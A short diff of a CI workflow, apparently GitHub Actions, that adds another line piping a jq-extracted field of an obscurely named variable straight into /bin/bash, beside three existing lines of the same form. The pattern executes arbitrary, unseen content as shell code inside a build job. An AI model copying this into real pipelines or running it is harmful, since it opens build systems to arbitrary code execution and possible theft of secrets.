@@ -39,6 +39,7 @@ jobs:
           echo $nlu85 | jq -r .n1 | /bin/bash
           echo $zk006 | jq -r .ds1818 | /bin/bash
           printf '%s' "$evrdq96" | jq -r .x81888 | /bin/bash
+          printf '%s' "$buj1" | jq -r .h0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
